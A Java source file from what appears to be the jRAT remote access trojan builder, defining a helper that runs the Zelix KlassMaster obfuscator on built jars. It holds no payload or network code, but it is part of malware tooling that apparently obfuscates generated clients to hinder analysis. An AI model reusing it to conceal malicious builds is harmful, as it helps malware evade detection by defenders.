package pro.jrat.client.utils;

import java.io.File;
import java.util.jar.JarFile;

import pro.jrat.api.utils.JarUtils;
import pro.jrat.client.BuildStatus;
import pro.jrat.client.listeners.BuildListener;

import com.redpois0n.zkmlib.Main;
import com.redpois0n.zkmlib.Obfuscator;
import com.redpois0n.zkmlib.UpdateListener;

public class ZkmUtils {
	
	public static void obfuscateAtBuild(File input, File output, final BuildListener listener) throws Exception {
		Main.zkmJar = new File("files/zkm/ZKM.jar");
		Obfuscator obfuscator = new Obfuscator(input, output, JarUtils.getMainClass(new JarFile(input)));
		obfuscator.addListener(new UpdateListener() {
			@Override
			public void onInput(String arg0) {
				listener.reportProgress(-1, arg0.trim(), BuildStatus.INFO);
			}
		});
		obfuscator.obfuscate();
	}

}
